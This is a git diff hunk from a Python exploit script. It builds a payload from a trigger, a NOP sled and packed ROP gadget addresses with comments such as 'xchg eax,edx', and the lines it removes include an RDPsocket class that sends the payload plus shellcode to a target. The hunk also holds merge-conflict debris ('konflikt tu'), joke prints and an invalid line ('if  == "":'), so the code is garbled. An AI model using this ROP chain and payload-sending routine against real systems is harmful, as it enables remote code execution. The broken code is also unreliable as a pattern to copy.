@@ -24,24 +24,6 @@ evil = trigger + nopsled
         parsed += struct.pack(">I", 0xffffffff) #value to store in ecx
         parsed += struct.pack(">I", 0x8fe0c0c7) #inc ecx # xor al,0xc9
 
-        print("konflikt tu")
-        :) #konflikt
-        parsed += struct.pack(">I", 0x8fe2def4) #add eax,ecx # ret # swap back
-        parsed += struct.pack(">I", 0x8fe0e32d) #xchg eax,edx # copy parameter to placeholder
-
-        if(1):
-            print("2")
-        print("xd")
-        return str(read(shellcode)), parsed
-
-    def connect(self, address):
-        self.parsed_shell = self.parse(address, shellcode)
-        super(RDPsocket, self).connect(address)
-
-    def evil_sendall(self):
-        super(RDPsocket, self).sendall(evil + self.parsed_shell[0] + self.parsed_shell[1])
-
-
 # balls
 
 if  == "":
